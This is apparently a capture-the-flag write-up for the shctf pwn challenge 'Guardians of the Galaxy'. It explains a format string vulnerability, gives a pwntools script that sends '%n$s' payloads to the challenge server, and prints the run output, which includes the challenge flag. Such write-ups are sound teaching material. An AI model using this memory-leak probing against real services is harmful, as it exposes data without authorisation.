---
title: "shctf/pwn: Guardians of the Galaxy"
date: 2022-04-06 10:33:54
tags:
- ctf
- shctf
- pwn
description: "Writeup for the shctf pwn challenge \"Guardians of the Galaxy\"."
permalink: ctfs/shctf/pwn/guardians-of-the-galaxy/
thumbnail: https://enscribe.dev/image/banner-ctfs.png
---

<style>
    .box {
        border: 1px solid rgba(100, 100, 100, .5);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
    }
    .flex-container {
        display: flex;
        flex-wrap: nowrap;
        justify-content: center;
    }
</style>

<p class="box">
Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format? <code>nc 0.cloud.chals.io 12690</code><br>
<b>Author</b>: GlitchArchetype<br>
<b>Files</b>: <a href="https://github.com/WhileSEC/shctf/blob/main/challenges/pwn/guardians-of-the-galaxy/files/guardians">guardians</a>
</p>

Let's look at what happens when you run that binary given to us.

```text
$ ./guardians 
Error, please message admins with 'infinity_error'.
```

This error is because the binary is probably trying to reference a `flag.txt` within its directory that doesn't exist. Let's create one and run it again:

```text
$ touch flag.txt && echo "FLAGHERE" > flag.txt
$ ./guardians
Does Quill manage to win the dance battle?
```

There, we got it to work locally. Since we know that this is problem a format string vulnerability from the "find a successful distraction format" part of the description, let's assume that the vulnerability is it writing our input to the stack with `printf()`. We will need to work our way up the stack with the format `%n$s`, where `n` is the decimal index of the argument you want, and `s` is the `printf()` specifier for a **string of characters**. I wrote this Python3/pwntools script here to achieve this loop:

```py
from pwn import *

for i in range(0, 100):
        p = remote('0.cloud.chals.io', 12690)  
        log.info(f"Trying offset {i}...")
        p.sendline(bytes(('%' + str(i) + '$s'), encoding='utf-8'))

        output = p.recvS()
        if 'shctf' in output:
                log.success(output)
                break
        p.close()
```

As you can see, it will send a UTF-8 encoded format string, with `str(i)` being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let's run it:

```text
$ python3 exp.py
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 0...
[*] Closed connection to 0.cloud.chals.io port 12690
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 1...
[*] Closed connection to 0.cloud.chals.io port 12690
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 2...
[*] Closed connection to 0.cloud.chals.io port 12690
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 3...
[*] Closed connection to 0.cloud.chals.io port 12690
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 4...
[*] Closed connection to 0.cloud.chals.io port 12690
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 5...
[*] Closed connection to 0.cloud.chals.io port 12690
[+] Opening connection to 0.cloud.chals.io on port 12690: Done
[*] Trying offset 6...
[+] Does Quill manage to win the dance battle?
    
    Oh no, Ronano has seen through the distraction!
    shctf{im_distracting_you}
```
